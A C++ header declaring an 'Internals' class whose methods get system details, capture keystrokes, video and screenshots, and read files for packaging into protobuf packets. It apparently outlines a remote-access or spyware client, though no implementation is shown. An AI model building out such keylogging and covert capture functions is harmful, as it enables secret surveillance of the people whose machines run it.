#pragma once

#include <iostream>
#include <Windows.h>
#include <lmcons.h>
#include <tchar.h>
#include <atlstr.h>
#include <vector>
#include <string>
#include <fstream>
#include "Packet.pb.h"





class Internals 
{
public:
	std::string GetName();
	std::string GetTime();
	std::string GetProcessor();
	int CaptureKey();
	int CaptureVid();
	char* Screenshot();
	long fileSize();
	unsigned char* File(char*filename);
};
